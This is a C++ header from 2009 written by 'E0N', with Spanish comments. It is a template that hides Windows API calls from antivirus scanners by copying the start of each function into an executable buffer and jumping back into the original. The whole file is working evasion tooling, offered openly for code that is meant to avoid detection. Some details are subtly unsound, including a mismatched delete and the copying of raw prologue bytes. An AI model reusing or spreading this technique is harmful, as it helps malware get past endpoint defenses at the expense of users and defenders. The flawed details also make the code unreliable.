
/**************************************************************************
 ***                                                                    ***
 ***     Clase     -> EncryptApi                                        ***
 ***     Autor     -> E0N                                               ***
 ***     Utilidad  -> Plantilla que encripta la llamada a las api's     ***
 ***                  dificultando la detección por parte de los AV     ***
 ***                  de nuestro código.                                ***
 ***     Uso       -> EncryptApi<valor_de_retorno> (nombre_del_api,     ***
 ***                                              nombre_de_la_dll,     ***
 ***                                       número_de_bytes_a_copiar)    ***
 ***     Mecanismo -> Al encriptar una api con esta  clase  se crea     ***
 ***                  un   buffer   intermedio  que   contiene  los     ***
 ***                  primeros   bytes   del   api   indicados   en     *** 
 ***                  número_de_bytes_a_copiar  y  un  salto al api     *** 
 ***                  original,  ejecutando  de  esta manera el api     ***
 ***                  elegida pero sin realizar una llamada directa     ***
 ***                  a la misma.                                       ***
 ***                                                                    ***
 ***     E0N Productions 2009                                           ***
 ***     http://e0n-productions.blogspot.com/                           ***
 ***                                                                    ***
 **************************************************************************/


#ifndef EncryptApiH
#define EncryptApiH

#include <cstdarg>
#include <windows.h>


template <class T>
class EncryptApi
{
  private:

	/**********************************************************************
	 ***                            ATRIBUTOS                           ***  
	 **********************************************************************/
	
	BYTE *buffer; // El buffer intermedio para llamar al api

		
	/**********************************************************************
	 ***                        MÉTODOS PRIVADOS                        ***  
	 **********************************************************************/

	// Ocultamos las constructoras por defecto
	EncryptApi(){}
	EncryptApi(const EncryptApi&){}
	EncryptApi operator=(EncryptApi){};
		
		

  public:

	/**********************************************************************
	 ***                    CONSTRUCTORA/DESTRUCTORA                    ***  
	 **********************************************************************/

	// Constructora, si falla lanza un -1
	EncryptApi(char* nombreApi, char* nombreDll, int numBytes);

	// Destructora
	~EncryptApi();


	/**********************************************************************
	 ***                        MÉTODOS PÚBLICOS                        ***  
	 **********************************************************************/

	// Función para realizar la llamada al api a encriptar
	T operator()(int numArgs, ...);

};


//-------------------------------------------------------------------------


/**************************************************************************
 ***                      CONSTRUCTORA/DESTRUCTORA                      ***  
 **************************************************************************/

template <class T>
EncryptApi<T>::EncryptApi(char* nombreApi, char* nombreDll, int numBytes)
{	
	// Creamos el buffer para llamar al api
	BYTE *dirApi;
	DWORD prot;
	int tamBuffer = numBytes+5;

	// Reservamos espacio para el buffer y le damos permisos de ejecución	
	buffer = new BYTE[tamBuffer]; 
	VirtualProtect(buffer, tamBuffer, PAGE_EXECUTE_READWRITE, &prot);

	// Obtenemos la dirección del API
	dirApi = (BYTE*)GetProcAddress(LoadLibraryA(nombreDll), nombreApi);

	// Preparamos el buffer, copiamos los primeros numBytes del api...
	memcpy(buffer, dirApi, numBytes); 
	buffer += numBytes;
	// ... y añadimos el salto
	*buffer = 0xE9;   // jmp
	buffer++;
	*((signed int *) buffer)= dirApi - buffer + numBytes - 4;

	// Dejamos el buffer apuntando bien
	buffer -= numBytes + 1;
}

// Destructora
template <class T>
EncryptApi<T>::~EncryptApi()
{
	delete buffer;
}


/**********************************************************************
 ***                        MÉTODOS PÚBLICOS                        ***  
 **********************************************************************/

template <class T>
T EncryptApi<T>::operator ()(int numArgs, ...)
{
	T retorno;                        // El valor de retorno
	va_list listaArgs;                // Para manejar los argumentos variables
	void** args = new void*[numArgs]; // Array con los argumentos
	
	// Rellenamos el array de argumentos
	va_start(listaArgs, numArgs);
	for (int n=0; n<numArgs; n++)
		args[n] = va_arg(listaArgs, void*);

	// Los metemos en la pila en el orden correcto

	for(int x=numArgs-1; x>=0; x--)
	{
		int temp = x*4;
		__asm
		{
			mov  eax, dword ptr args
			add  eax, temp
			push [eax]
		}
	}

	// Ejecutamos el buffer intermedio
	BYTE *tem = buffer;
	__asm
	{
		mov eax, tem
		call eax
		mov  retorno, eax
	}
	
	delete [] args;
	va_end(listaArgs);
	return retorno;
}


#endif
